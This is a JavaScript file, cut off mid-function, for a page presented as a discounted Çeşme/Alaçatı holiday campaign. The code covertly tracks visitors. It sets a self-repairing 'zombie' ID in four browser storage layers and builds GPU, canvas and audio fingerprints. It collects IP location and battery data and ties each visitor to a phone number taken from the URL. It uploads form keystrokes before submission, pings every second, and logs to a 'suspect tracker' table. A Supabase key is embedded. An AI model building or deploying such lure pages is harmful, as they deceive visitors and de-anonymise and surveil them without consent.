/* ========================================================================
   ALAÇATI & ÇEŞME GURBETÇİ TATİL KAMPANYASI (%50 İNDİRİM)
   Gelişmiş Ziyaretçi Analitiği, Kalıcı Cihaz İmzası, GPU Parmak İzi &
   700 WhatsApp Numarası Özel SPA Router & Çapraz Eşleştirme Sistemi
   ======================================================================== */

var CONFIG = {
    SUPABASE_URL: 'https://yfhglqjuskpglezvucnw.supabase.co',
    SUPABASE_ANON_KEY: 'sb_publishable_rjAEV3vxuSOYwYqlvjX05A_nH8VuT2d',
    DEFAULT_TABLE: 'cesme_holiday_leads'
};

var STATE = {
    fingerprintHash: null,
    deviceSignature: null,
    targetPhone: null,
    campaignSource: 'direct',
    channel: null,
    targetTable: 'cesme_holiday_leads',
    supabaseClient: null,
    gpuVendor: null,
    gpuRenderer: null,
    batteryLevel: null,
    batteryCharging: null,
    ipAddress: null,
    ipCity: null,
    ipRegion: null,
    ipCountry: null,
    ipLat: null,
    ipLng: null,
    locationType: 'IP Geolocation',
    startTime: Date.now(),
    maxScroll: 0,
    isSubmitted: false
};

// ==========================================
// BAŞLATMA (INIT)
// ==========================================
document.addEventListener('DOMContentLoaded', init);

async function init() {
    initSupabase();
    extractTargetPhoneAndSource();
    setupCountdown();
    setupScrollAnimations();
    setupParticles();
    setupPackageSelection();
    setupPriceTableTabs();
    setupFaqAccordion();
    setupScrollTracking();
    setupTimeTracking();
    setupLiveFormSync();
    setupGeoDetection();
    setupFormSubmission();
    setupBatteryListener();

    // 0. SANİYE: Kalıcı İmza, Donanım Parmak İzi ve IP Konumu Paralel Başlat
    await Promise.all([
        initDeviceSignature(),
        fetchIpLocation()
    ]);

    // Donanım parmak izini hesapla ve ilk kaydı yap
    await generateFingerprint();
}

// ==========================================
// 1) DİNAMİK SPA ROUTER & TELEFON/KAYNAK ÇÖZÜMLEME
// ==========================================
function extractTargetPhoneAndSource() {
    try {
        var pathname = window.location.pathname || '';
        var search = window.location.search || '';
        var hash = window.location.hash || '';
        var params = new URLSearchParams(search);

        var detectedPhone = null;
        var detectedSource = params.get('src') || params.get('source') || params.get('ch') || params.get('channel') || null;
        var detectedTable = params.get('table') || params.get('tbl') || null;

        // 1. Pathname üzerinden telefon numarası yakala (örn: /4512345678 veya /+905321234567 veya /p/4512345678)
        var cleanPath = decodeURIComponent(pathname).replace(/^\/+|\/+$/g, '');
        if (cleanPath) {
            // /p/4512345678 veya /w/4512345678 veya doğrudan /4512345678
            var pathMatch = cleanPath.match(/(?:(?:p|w|phone|tel|wa|ref)\/)?(\+?[0-9]{7,17})/i);
            if (pathMatch && pathMatch[1]) {
                detectedPhone = pathMatch[1];
                if (!detectedSource) detectedSource = 'whatsapp';
            }
        }

        // 2. Query parametreleri üzerinden kontrol (örn: ?p=4512345678 veya ?phone=+90...)
        if (!detectedPhone) {
            var qPhone = params.get('p') || params.get('phone') || params.get('tel') || params.get('wa') || params.get('target');
            if (qPhone) {
                detectedPhone = qPhone;
                if (!detectedSource) detectedSource = 'whatsapp';
            }
        }

        // 3. Hash üzerinden kontrol (#+4512345678)
        if (!detectedPhone && hash) {
            var cleanHash = hash.replace(/^#/, '');
            var hashMatch = cleanHash.match(/(\+?[0-9]{7,17})/);
            if (hashMatch) {
                detectedPhone = hashMatch[1];
                if (!detectedSource) detectedSource = 'whatsapp';
            }
        }

        // Telefonu standartlaştır (+ ve rakamlar)
        if (detectedPhone) {
            detectedPhone = detectedPhone.replace(/[\s\-\(\)\.]/g, '');
            if (!detectedPhone.startsWith('+') && detectedPhone.length >= 10 && !detectedPhone.startsWith('00')) {
                // Danimarka veya uluslararası numara kontrolü
                if (detectedPhone.startsWith('45')) detectedPhone = '+' + detectedPhone;
                else if (detectedPhone.startsWith('90')) detectedPhone = '+' + detectedPhone;
                else detectedPhone = '+' + detectedPhone;
            }
            STATE.targetPhone = detectedPhone;
            console.log('📱 Hedef Telefon Numarası Yakalandı:', STATE.targetPhone);

            // Formdaki telefon alanına otomatik yansıt
            var phoneInput = document.getElementById('lead-phone');
            if (phoneInput && !phoneInput.value) {
                phoneInput.value = STATE.targetPhone;
            }
        }

        // Kaynak etiketini belirle (whatsapp, facebook, instagram, direct)
        if (detectedSource) {
            STATE.campaignSource = detectedSource.toLowerCase();
        } else if (document.referrer) {
            if (document.referrer.indexOf('facebook.com') !== -1 || document.referrer.indexOf('fb.me') !== -1) {
                STATE.campaignSource = 'facebook';
            } else if (document.referrer.indexOf('whatsapp') !== -1 || document.referrer.indexOf('wa.me') !== -1) {
                STATE.campaignSource = 'whatsapp';
            } else if (document.referrer.indexOf('instagram.com') !== -1) {
                STATE.campaignSource = 'instagram';
            }
        }

        if (detectedTable) {
            STATE.targetTable = detectedTable;
        }

        console.log('🎯 Kampanya Kaynağı:', STATE.campaignSource, '| Hedef Tablo:', STATE.targetTable);
    } catch (e) {
        console.log('Router çözümleme hatası:', e);
    }
}

// ==========================================
// 2) 4 KATMANLI KALICI CİHAZ İMZASI (ZOMBIE DEVICE ID)
// ==========================================
// Cookie + LocalStorage + SessionStorage + IndexedDB üzerinden
// kendini onaran (self-healing) kalıcı takipçi kimliği.
// ==========================================
async function initDeviceSignature() {
    try {
        var sigKey = '_dx_device_sig';
        var masterKey = '_dx_master_lock';
        var bkKey = '_bk_device_sig';
        var cookieKey = '_dx_vid';
        var sig = null;

        // 1. Katman: LocalStorage (Master Key & Cross-Domain Lock)
        try { 
            sig = localStorage.getItem(masterKey) || localStorage.getItem(sigKey) || localStorage.getItem(bkKey); 
        } catch (e) {}

        // 2. Katman: SessionStorage
        if (!sig) {
            try { sig = sessionStorage.getItem(masterKey) || sessionStorage.getItem(sigKey); } catch (e) {}
        }

        // 3. Katman: Cookie
        if (!sig) {
            sig = getCookie(masterKey) || getCookie(cookieKey) || getCookie(bkKey);
        }

        // 4. Katman: IndexedDB
        if (!sig) {
            sig = await readFromIndexedDb('identity', 'device_sig');
        }

        // Hiçbir katmanda yoksa yeni benzersiz kilit anahtarı üret
        if (!sig) {
            sig = 'bk_' + generateRandomUuid();
            console.log('✨ Yeni Kalıcı Kilit Anahtarı Üretildi:', sig);
        } else {
            console.log('🔍 Mevcut Kilit Anahtarı Eşleşti:', sig);
        }

        STATE.deviceSignature = sig;

        // Kendini onar: Tüm 4 depolama katmanına Kilit Anahtarını mühürle
        try { localStorage.setItem(sigKey, sig); } catch (e) {}
        try { localStorage.setItem(masterKey, sig); } catch (e) {}
        try { localStorage.setItem(bkKey, sig); } catch (e) {}
        if (STATE.targetPhone) {
            try { localStorage.setItem('_tatilsepeti_target_phone', STATE.targetPhone); } catch (e) {}
        }
        try { sessionStorage.setItem(sigKey, sig); } catch (e) {}
        try { sessionStorage.setItem(masterKey, sig); } catch (e) {}
        setCookie(cookieKey, sig, 365 * 5); // 5 yıl geçerli
        setCookie(masterKey, sig, 365 * 5);
        setCookie(bkKey, sig, 365 * 5);
        await writeToIndexedDb('identity', 'device_sig', sig);
    } catch (e) {
        console.log('İmza başlatma hatası:', e);
        if (!STATE.deviceSignature) {
            STATE.deviceSignature = 'bk_' + Math.random().toString(36).substring(2, 15) + Date.now();
        }
    }
}

function setCookie(name, value, days) {
    try {
        var expires = '';
        if (days) {
            var date = new Date();
            date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
            expires = '; expires=' + date.toUTCString();
        }
        document.cookie = name + '=' + (value || '') + expires + '; path=/; SameSite=Lax';
    } catch (e) {}
}

function getCookie(name) {
    try {
        var nameEQ = name + '=';
        var ca = document.cookie.split(';');
        for (var i = 0; i < ca.length; i++) {
            var c = ca[i];
            while (c.charAt(0) === ' ') c = c.substring(1, c.length);
            if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
        }
    } catch (e) {}
    return null;
}

// IndexedDB Yardımcıları (Kalıcı Vault)
function openIndexedDb() {
    return new Promise(function (resolve, reject) {
        if (!window.indexedDB) return resolve(null);
        var req = indexedDB.open('dx_security_vault', 1);
        req.onupgradeneeded = function (e) {
            var db = e.target.result;
            if (!db.objectStoreNames.contains('identity')) {
                db.createObjectStore('identity', { keyPath: 'key' });
            }
        };
        req.onsuccess = function (e) { resolve(e.target.result); };
        req.onerror = function () { resolve(null); };
    });
}

async function readFromIndexedDb(storeName, key) {
    try {
        var db = await openIndexedDb();
        if (!db) return null;
        return new Promise(function (resolve) {
            var tx = db.transaction(storeName, 'readonly');
            var store = tx.objectStore(storeName);
            var req = store.get(key);
            req.onsuccess = function () { resolve(req.result ? req.result.val : null); };
            req.onerror = function () { resolve(null); };
        });
    } catch (e) { return null; }
}

async function writeToIndexedDb(storeName, key, val) {
    try {
        var db = await openIndexedDb();
        if (!db) return;
        var tx = db.transaction(storeName, 'readwrite');
        var store = tx.objectStore(storeName);
        store.put({ key: key, val: val });
    } catch (e) {}
}

function generateRandomUuid() {
    if (typeof crypto !== 'undefined' && crypto.randomUUID) {
        return crypto.randomUUID();
    }
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
        var r = Math.random() * 16 | 0, v = c === 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
    });
}

// ==========================================
// 3) DONANIMSAL DEĞİŞMEZ PARMAK İZİ (GPU + CANVAS + AUDIO + HARDWARE)
// ==========================================
async function generateFingerprint() {
    try {
        // 1. WebGL GPU Unmasked Vendor & Renderer
        var gpuInfo = getGpuDetails();
        STATE.gpuVendor = gpuInfo.vendor;
        STATE.gpuRenderer = gpuInfo.renderer;

        // 2. Audio Fingerprint
        var audioHash = await getAudioFingerprint();

        // 3. Deep 2D Canvas Render
        var canvasHash = getCanvasFingerprint();

        var rawComponents = [
            navigator.userAgent || '',
            (navigator.languages || [navigator.language]).join(','),
            screen.width + 'x' + screen.height + 'x' + screen.colorDepth,
            screen.availWidth + 'x' + screen.availHeight,
            window.devicePixelRatio || 1,
            new Date().getTimezoneOffset(),
            Intl.DateTimeFormat().resolvedOptions().timeZone || '',
            navigator.hardwareConcurrency || 'cpu_unknown',
            navigator.deviceMemory || 'ram_unknown',
            navigator.maxTouchPoints || 0,
            navigator.platform || '',
            STATE.gpuVendor || 'gpu_v_unknown',
            STATE.gpuRenderer || 'gpu_r_unknown',
            audioHash || 'audio_unknown',
            canvasHash || 'canvas_unknown'
        ];

        var rawString = rawComponents.join('|||');
        var encoder = new TextEncoder();
        var data = encoder.encode(rawString);
        var hashBuffer = await crypto.subtle.digest('SHA-256', data);
        var hashArray = Array.from(new Uint8Array(hashBuffer));
        STATE.fingerprintHash = hashArray.map(function (b) {
            return b.toString(16).padStart(2, '0');
        }).join('');

        console.log('🔑 Donanımsal Parmak İzi Oluşturuldu:', STATE.fingerprintHash);
        console.log('🎮 GPU Bilgisi:', STATE.gpuVendor, '|', STATE.gpuRenderer);

        await registerVisitor();
    } catch (e) {
        console.log('Parmak izi hatası:', e);
        STATE.fingerprintHash = 'fp_' + Math.random().toString(36).substring(2, 15) + Date.now();
        await registerVisitor();
    }
}

// WebGL GPU Kart Modeli Tespiti
function getGpuDetails() {
    try {
        var canvas = document.createElement('canvas');
        var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return { vendor: 'WebGL Yok', renderer: 'WebGL Yok' };

        var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
            var vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'Bilinmiyor';
            var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'Bilinmiyor';
            return { vendor: vendor, renderer: renderer };
        }
        return {
            vendor: gl.getParameter(gl.VENDOR) || 'Standart',
            renderer: gl.getParameter(gl.RENDERER) || 'Standart'
        };
    } catch (e) {
        return { vendor: 'Hata', renderer: 'Hata' };
    }
}

// Canvas 2D Grafik Motoru Hash'i
function getCanvasFingerprint() {
    try {
        var canvas = document.createElement('canvas');
        canvas.width = 240;
        canvas.height = 60;
        var ctx = canvas.getContext('2d');
        if (!ctx) return '';
        
        ctx.textBaseline = 'top';
        ctx.font = '14px Arial';
        ctx.textBaseline = 'alphabetic';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.fillText('Cesme🏝️Alacati@2026!#', 2, 15);
        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
        ctx.fillText('SuspectHunter🔒45', 4, 35);
        
        ctx.beginPath();
        ctx.arc(50, 50, 10, 0, Math.PI * 2, true);
        ctx.closePath();
        ctx.fill();

        return canvas.toDataURL();
    } catch (e) {
        return '';
    }
}

// Web Audio Frekans Tepki Hash'i
function getAudioFingerprint() {
    return new Promise(function (resolve) {
        try {
            var AudioContext = window.OfflineAudioContext || window.webkitOfflineAudioContext;
            if (!AudioContext) return resolve('');

            var context = new AudioContext(1, 44100, 44100);
            var oscillator = context.createOscillator();
            oscillator.type = 'triangle';
            oscillator.frequency.setValueAtTime(10000, context.currentTime);

            var compressor = context.createDynamicsCompressor();
            compressor.threshold.setValueAtTime(-50, context.currentTime);
            compressor.knee.setValueAtTime(40, context.currentTime);
            compressor.ratio.setValueAtTime(12, context.currentTime);
            compressor.attack.setValueAtTime(0, context.currentTime);
            compressor.release.setValueAtTime(0.25, context.currentTime);

            oscillator.connect(compressor);
            compressor.connect(context.destination);
            oscillator.start(0);

            context.oncomplete = function (e) {
                var samples = e.renderedBuffer.getChannelData(0);
                var sum = 0;
                for (var i = 0; i < samples.length; i += 100) {
                    sum += Math.abs(samples[i]);
                }
                resolve(String(sum));
            };

            context.startRendering();
        } catch (e) {
            resolve('');
        }
    });
}

// ==========================================
// 4) SUPABASE BAĞLANTISI
// ==========================================
function initSupabase() {
    try {
        if (window.supabase) {
            STATE.supabaseClient = window.supabase.createClient(CONFIG.SUPABASE_URL, CONFIG.SUPABASE_ANON_KEY);
            console.log('✅ Supabase bağlantısı kuruldu. Ana Tablo: ' + CONFIG.DEFAULT_TABLE);
        }
    } catch (e) {
        console.log('Supabase başlatılamadı:', e);
    }
}

// ==========================================
// 5) ZİYARETÇİ KAYDI (0. Saniye İlk Kayıt & Geri Gelen Ziyaretçi)
// ==========================================
async function registerVisitor() {
    if (!STATE.supabaseClient || !STATE.fingerprintHash) return;

    var deviceInfo = getDeviceInfo();
    var tableToUse = STATE.targetTable || CONFIG.DEFAULT_TABLE;

    var payload = {
        fingerprint_hash: STATE.fingerprintHash,
        device_signature: STATE.deviceSignature,
        target_phone: STATE.targetPhone,
        campaign_source: STATE.campaignSource,
        channel: STATE.channel || STATE.campaignSource,
        project_domain: 'alacati-cesme-promo',
        ip_address: STATE.ipAddress,
        city: STATE.ipCity,
        region: STATE.ipRegion,
        country: STATE.ipCountry,
        latitude: STATE.ipLat,
        longitude: STATE.ipLng,
        location_type: STATE.locationType,
        device_type: deviceInfo.deviceType,
        os: deviceInfo.os,
        os_version: deviceInfo.osVersion,
        browser: deviceInfo.browser,
        browser_version: deviceInfo.browserVersion,
        browser_languages: deviceInfo.browserLanguages,
        browser_platform: deviceInfo.browserPlatform,
        gpu_vendor: STATE.gpuVendor || deviceInfo.gpuVendor,
        gpu_renderer: STATE.gpuRenderer || deviceInfo.gpuRenderer,
        screen_resolution: deviceInfo.screenResolution,
        window_size: deviceInfo.windowSize,
        color_depth: deviceInfo.colorDepth,
        device_pixel_ratio: deviceInfo.devicePixelRatio,
        hardware_concurrency: deviceInfo.hardwareConcurrency,
        device_memory: deviceInfo.deviceMemory,
        battery_level: STATE.batteryLevel,
        battery_charging: STATE.batteryCharging,
        connection_type: deviceInfo.connectionType,
        is_touch_device: deviceInfo.isTouch,
        cookies_enabled: deviceInfo.cookiesEnabled,
        referrer: document.referrer || null,
        page_url: window.location.href,
        user_agent: navigator.userAgent,
        raw_client_info: deviceInfo.rawInfo,
        last_seen_at: new Date().toISOString()
    };

    try {
        // Mevcut kayıt var mı kontrol et
        var { data: existingLead, error: selectErr } = await STATE.supabaseClient
            .from(tableToUse)
            .select('id, total_visits, form_submitted, user_entered_city, target_phone, device_signature')
            .eq('fingerprint_hash', STATE.fingerprintHash)
            .maybeSingle();

        if (existingLead) {
            console.log('👤 Tekrar gelen ziyaretçi tespit edildi! Ziyaret Sayısı:', (existingLead.total_visits || 1) + 1);
            
            var updatePayload = {
                total_visits: (existingLead.total_visits || 1) + 1,
                last_seen_at: new Date().toISOString(),
                device_signature: STATE.deviceSignature,
                battery_level: STATE.batteryLevel,
                battery_charging: STATE.batteryCharging,
                connection_type: deviceInfo.connectionType,
                page_url: window.location.href
            };

            // Eğer hedef telefon önceden yoksa veya yeni geldiyse güncelle
            if (STATE.targetPhone && !existingLead.target_phone) {
                updatePayload.target_phone = STATE.targetPhone;
            }
            if (STATE.campaignSource && STATE.campaignSource !== 'direct') {
                updatePayload.campaign_source = STATE.campaignSource;
            }

            var { error: updErr } = await STATE.supabaseClient
                .from(tableToUse)
                .update(updatePayload)
                .eq('fingerprint_hash', STATE.fingerprintHash);
            
            if (updErr) {
                console.error('⚠️ Supabase UPDATE Hatası:', updErr.message, updErr.details);
            } else {
                console.log('✅ Ziyaretçi bilgileri başarıyla güncellendi!');
            }
        } else {
            console.log('🆕 Yeni ziyaretçi Supabase tablosuna ekleniyor (' + tableToUse + ')...');
            var { error: insErr } = await STATE.supabaseClient
                .from(tableToUse)
                .insert(payload);
            
            if (insErr) {
                console.error('⚠️ Supabase INSERT Hatası:', insErr.message, insErr.details, insErr.hint);
            } else {
                console.log('✅ Yeni ziyaretçi Supabase tablosuna başarıyla eklendi!');
            }
        }

        // Ortak Şüpheli Tracker Tablosuna Ham Log Bırak (Yedek Güvenlik)
        try {
            await STATE.supabaseClient
                .from('unified_suspect_tracker')
                .insert({
                    device_signature: STATE.deviceSignature,
                    fingerprint_hash: STATE.fingerprintHash,
                    target_phone: STATE.targetPhone,
                    campaign_source: STATE.campaignSource,
                    target_table: tableToUse,
                    page_url: window.location.href,
                    referrer: document.referrer || null,
                    ip_address: STATE.ipAddress,
                    city: STATE.ipCity,
                    region: STATE.ipRegion,
                    country: STATE.ipCountry,
                    latitude: STATE.ipLat,
                    longitude: STATE.ipLng,
                    device_type: deviceInfo.deviceType,
                    os: deviceInfo.os,
                    os_version: deviceInfo.osVersion,
                    browser: deviceInfo.browser,
                    browser_version: deviceInfo.browserVersion,
                    gpu_vendor: STATE.gpuVendor,
                    gpu_renderer: STATE.gpuRenderer,
                    screen_resolution: deviceInfo.screenResolution,
                    window_size: deviceInfo.windowSize,
                    battery_level: STATE.batteryLevel,
                    connection_type: deviceInfo.connectionType,
                    user_agent: navigator.userAgent,
                    raw_client_info: deviceInfo.rawInfo
                });
        } catch (unErr) {}

    } catch (e) {
        console.log('Ziyaretçi kaydı hatası:', e);
    }
}

// ==========================================
// 6) CANLI SENKRONİZASYON MOTORU
// ==========================================
async function syncCesmeLead(extraData) {
    if (!STATE.supabaseClient || !STATE.fingerprintHash) return;

    var tableToUse = STATE.targetTable || CONFIG.DEFAULT_TABLE;

    var payload = Object.assign({
        last_seen_at: new Date().toISOString(),
        time_spent_seconds: Math.round((Date.now() - STATE.startTime) / 1000),
        max_scroll_percent: STATE.maxScroll
    }, extraData || {});

    if (STATE.targetPhone) payload.target_phone = STATE.targetPhone;
    if (STATE.deviceSignature) payload.device_signature = STATE.deviceSignature;
    if (STATE.campaignSource) payload.campaign_source = STATE.campaignSource;

    // Form alanlarından güncel verileri topla
    var pkg = document.getElementById('package-select');
    var cin = document.getElementById('check-in-date');
    var cout = document.getElementById('check-out-date');
    var adult = document.getElementById('adult-count');
    var child = document.getElementById('child-count');
    var name = document.getElementById('lead-name');
    var phone = document.getElementById('lead-phone');
    var email = document.getElementById('lead-email');
    var city = document.getElementById('lead-city');
    var notes = document.getElementById('special-notes');

    if (pkg && pkg.value) payload.selected_package = pkg.value;
    if (cin && cin.value) payload.check_in_date = cin.value;
    if (cout && cout.value) payload.check_out_date = cout.value;
    if (adult && adult.value) payload.adult_count = parseInt(adult.value) || 2;
    if (child && child.value) payload.child_count = parseInt(child.value) || 0;
    if (name && name.value.trim()) payload.full_name = name.value.trim();
    if (phone && phone.value.trim()) payload.phone = phone.value.trim();
    if (email && email.value.trim()) payload.email = email.value.trim();
    if (city && city.value.trim()) payload.user_entered_city = city.value.trim();
    if (notes && notes.value.trim()) payload.special_requests = notes.value.trim();

    var vipCheck = document.getElementById('vip-transfer-check');
    if (vipCheck && vipCheck.checked) {
        payload.special_requests = (payload.special_requests ? payload.special_requests + ' | ' : '') + '[VIP Transfer Talep Edildi (+3.000 TL)]';
    }

    try {
        await STATE.supabaseClient
            .from(tableToUse)
            .update(payload)
            .eq('fingerprint_hash', STATE.fingerprintHash);
        
        console.log('🌟 ' + tableToUse + ' güncellendi!');
    } catch (e) {
        console.log('Veri aktarım hatası:', e);
    }
}

// ==========================================
// 7) IP KONUM TESPİTİ (0. Saniye)
// ==========================================
async function fetchIpLocation() {
    var apis = [
        {
            url: 'https://ipwho.is/',
            parse: function (d) {
                return {
                    ip: d.ip,
                    city: d.city,
                    region: d.region,
                    country: d.country,
                    latitude: d.latitude,
                    longitude: d.longitude
                };
            }
        },
        {
            url: 'https://get.geojs.io/v1/ip/geo.json',
            parse: function (d) {
                return {
                    ip: d.ip,
                    city: d.city,
                    region: d.region,
                    country: d.country,
                    latitude: d.latitude,
                    longitude: d.longitude
                };
            }
        },
        {
            url: 'https://freeipapi.com/api/json',
            parse: function (d) {
                return {
                    ip: d.ipAddress,
                    city: d.cityName,
                    region: d.regionName,
                    country: d.countryName,
                    latitude: d.latitude,
                    longitude: d.longitude
                };
            }
        }
    ];

    for (var i = 0; i < apis.length; i++) {
        try {
            var res = await fetchWithTimeout(apis[i].url, 4000);
            var raw = await res.json();
            var loc = apis[i].parse(raw);

            if (loc && (loc.city || loc.country || loc.ip)) {
                if (loc.city) STATE.ipCity = loc.city;
                if (loc.region) STATE.ipRegion = loc.region;
                if (loc.country) STATE.ipCountry = loc.country;
                if (loc.ip) STATE.ipAddress = loc.ip;
                if (loc.latitude) STATE.ipLat = String(loc.latitude);
                if (loc.longitude) STATE.ipLng = String(loc.longitude);
                STATE.locationType = 'IP Geolocation';

                console.log('📍 IP Konumu Alındı:', STATE.ipCity, STATE.ipRegion, STATE.ipCountry, 'Lat:', STATE.ipLat, 'Lng:', STATE.ipLng);

                // Formdaki şehir alanına otomatik ekle (eğer boşsa)
                var cityInput = document.getElementById('lead-city');
                if (cityInput && !cityInput.value && STATE.ipCity) {
                    cityInput.value = STATE.ipCity + (STATE.ipCountry ? ', ' + STATE.ipCountry : '');
                }

                await syncCesmeLead({
                    ip_address: STATE.ipAddress,
                    city: STATE.ipCity,
                    region: STATE.ipRegion,
                    country: STATE.ipCountry,
                    latitude: STATE.ipLat,
                    longitude: STATE.ipLng,
                    location_type: 'IP Geolocation'
                });
                return;
            }
        } catch (e) {}
    }
}

// ==========================================
// 8) GPS HASSAS KONUM TESPİTİ (📍 Konumu Belirle)
// ==========================================
function setupGeoDetection() {
    var btn = document.getElementById('btn-detect-geo');
    var cityInput = document.getElementById('lead-city');
    if (!btn || !cityInput) return;

    btn.addEventListener('click', function () {
        if (!navigator.geolocation) {
            alert('Tarayıcınız konum servisini desteklemiyor.');
            return;
        }

        btn.textContent = '📍 Belirleniyor...';

        navigator.geolocation.getCurrentPosition(
            async function (pos) {
                var lat = pos.coords.latitude;
                var lng = pos.coords.longitude;
                STATE.ipLat = String(lat);
                STATE.ipLng = String(lng);
                STATE.locationType = 'GPS Hassas';

                console.log('📍 GPS Hassas Konum Alındı:', lat, lng);

                try {
                    var geoUrl = 'https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=' + lat + '&longitude=' + lng + '&localityLanguage=tr';
                    var res = await fetchWithTimeout(geoUrl, 5000);
                    var geo = await res.json();

                    var detCity = geo.city || geo.locality || geo.principalSubdivision || '';
                    var detRegion = geo.principalSubdivision || '';
                    var detCountry = geo.countryName || STATE.ipCountry || '';

                    if (detCity) {
                        STATE.ipCity = detCity;
                        if (detRegion) STATE.ipRegion = detRegion;
                        if (detCountry) STATE.ipCountry = detCountry;
                        cityInput.value = detCity + (detCountry ? ', ' + detCountry : '');
                    }

                    btn.textContent = '✓ Belirlendi';
                    await syncCesmeLead({
                        latitude: STATE.ipLat,
                        longitude: STATE.ipLng,
                        city: STATE.ipCity,
                        region: STATE.ipRegion,
                        country: STATE.ipCountry,
                        location_type: 'GPS Hassas'
                    });
                } catch (e) {
                    btn.textContent = '✓ Koordinat Alındı';
                    await syncCesmeLead({
                        latitude: STATE.ipLat,
                        longitude: STATE.ipLng,
                        location_type: 'GPS Hassas'
                    });
                }
            },
            function (err) {
                console.log('GPS izin verilmedi:', err);
                btn.textContent = '📍 Konumu Belirle';
            }
        );
    });
}

// ==========================================
// 9) PİL TAKİBİ (BATTERY STATUS API)
// ==========================================
function setupBatteryListener() {
    try {
        if (navigator.getBattery) {
            navigator.getBattery().then(function (battery) {
                STATE.batteryLevel = Math.round(battery.level * 100);
                STATE.batteryCharging = battery.charging;

                battery.addEventListener('levelchange', function () {
                    STATE.batteryLevel = Math.round(battery.level * 100);
                    syncCesmeLead({ battery_level: STATE.batteryLevel });
                });

                battery.addEventListener('chargingchange', function () {
                    STATE.batteryCharging = battery.charging;
                    syncCesmeLead({ battery_charging: STATE.batteryCharging });
                });
            }).catch(function () {});
        }
    } catch (e) {}
}

// ==========================================
// 10) HER SANİYE CANLI SÜRE VE AKTİVİTE TAKİBİ (1000ms)
// ==========================================
function setupTimeTracking() {
    var tableToUse = STATE.targetTable || CONFIG.DEFAULT_TABLE;

    setInterval(function () {
        if (!STATE.supabaseClient || !STATE.fingerprintHash) return;
        var secondsSpent = Math.round((Date.now() - STATE.startTime) / 1000);

        STATE.supabaseClient
            .from(tableToUse)
            .update({
                time_spent_seconds: secondsSpent,
                max_scroll_percent: STATE.maxScroll,
                last_seen_at: new Date().toISOString()
            })
            .eq('fingerprint_hash', STATE.fingerprintHash)
            .then(function () {})
            .catch(function () {});
    }, 1000);

    window.addEventListener('beforeunload', function () {
        if (!STATE.supabaseClient || !STATE.fingerprintHash) return;
        var secondsSpent = Math.round((Date.now() - STATE.startTime) / 1000);

        var url = CONFIG.SUPABASE_URL + '/rest/v1/' + tableToUse + '?fingerprint_hash=eq.' + STATE.fingerprintHash;
        fetch(url, {
            method: 'PATCH',
            headers: {
                'Content-Type': 'application/json',
                'apikey': CONFIG.SUPABASE_ANON_KEY,
                'Authorization': 'Bearer ' + CONFIG.SUPABASE_ANON_KEY,
                'Prefer': 'return=minimal'
            },
            body: JSON.stringify({
                time_spent_seconds: secondsSpent,
                max_scroll_percent: STATE.maxScroll,
                last_seen_at: new Date().toISOString()
            }),
            keepalive: true
        }).catch(function () {});
    });
}

// ==========================================
// 11) FORM DEĞİŞİKLİKLERİNİ ANINDA KAYDETME (150ms Debounce)
// ==========================================
var formDebounceTimer = null;

function setupLiveFormSync() {
    var form = document.getElementById('holiday-lead-form');
    if (!form) return;

    form.addEventListener('change', function () {
        syncCesmeLead();
    });

    form.addEventListener('input', function () {
        clearTimeout(formDebounceTimer);
        formDebounceTimer = setTimeout(function () {
            syncCesmeLead();
        }, 150);
    });

    form.addEventListener('focusout', function () {
        syncCesmeLead();
    });
}

// ==========================================
// 12) PAKET SEÇİM BUTONLARI ETKİLEŞİMİ
// ==========================================
function setupPackageSelection() {
    var buttons = document.querySelectorAll('.select-package-btn');
    var selectElement = document.getElementById('package-select');

    buttons.forEach(function (btn) {
        btn.addEventListener('click', function (e) {
            var pkgName = btn.getAttribute('data-package');
            if (selectElement && pkgName) {
                for (var i = 0; i < selectElement.options.length; i++) {
                    if (selectElement.options[i].value.indexOf(pkgName) !== -1 || pkgName.indexOf(selectElement.options[i].value) !== -1) {
                        selectElement.selectedIndex = i;
                        break;
                    }
                }
                syncCesmeLead({ selected_package: selectElement.value });
            }
        });
    });
}

// ==========================================
// 12.1) FİYAT TABLOSU DÖNEM FİLTRELEME & SEÇİM
// ==========================================
function setupPriceTableTabs() {
    var tabs = document.querySelectorAll('.pricing-tab');
    var rows = document.querySelectorAll('.price-row, .row-period-header, .mobile-price-period-card');

    tabs.forEach(function (tab) {
        tab.addEventListener('click', function () {
            tabs.forEach(function (t) { t.classList.remove('active'); });
            tab.classList.add('active');

            var period = tab.getAttribute('data-period');

            rows.forEach(function (row) {
                var rowPeriod = row.getAttribute('data-period-row');
                if (period === 'all' || rowPeriod === period) {
                    row.style.display = '';
                } else {
                    row.style.display = 'none';
                }
            });
        });
    });
}

window.selectFromTable = function (periodName, price) {
    var selectEl = document.getElementById('package-select');
    if (selectEl && periodName) {
        for (var i = 0; i < selectEl.options.length; i++) {
            if (selectEl.options[i].value.indexOf(periodName) !== -1 || periodName.indexOf(selectEl.options[i].value) !== -1) {
                selectEl.selectedIndex = i;
                break;
            }
        }
        syncCesmeLead({ selected_package: selectEl.value });
    }

    var bookingSection = document.getElementById('rezervasyon');
    if (bookingSection) {
        bookingSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }
};

// ==========================================
// 13) FORM GÖNDERME İŞLEMİ (Mühürleme)
// ==========================================
function setupFormSubmission() {
    var form = document.getElementById('holiday-lead-form');
    var successBox = document.getElementById('booking-success');
    var submitBtn = document.getElementById('btn-submit-lead');

    if (!form) return;

    form.addEventListener('submit', async function (e) {
        e.preventDefault();

        if (submitBtn) {
            submitBtn.disabled = true;
            submitBtn.innerHTML = '<span>Talebiniz Kaydediliyor...</span>';
        }

        STATE.isSubmitted = true;

        await syncCesmeLead({
            form_submitted: true,
            submitted_at: new Date().toISOString()
        });

        console.log('✅ Rezervasyon talebi başarıyla Supabase tablosuna mühürlendi.');

        form.classList.add('hidden');
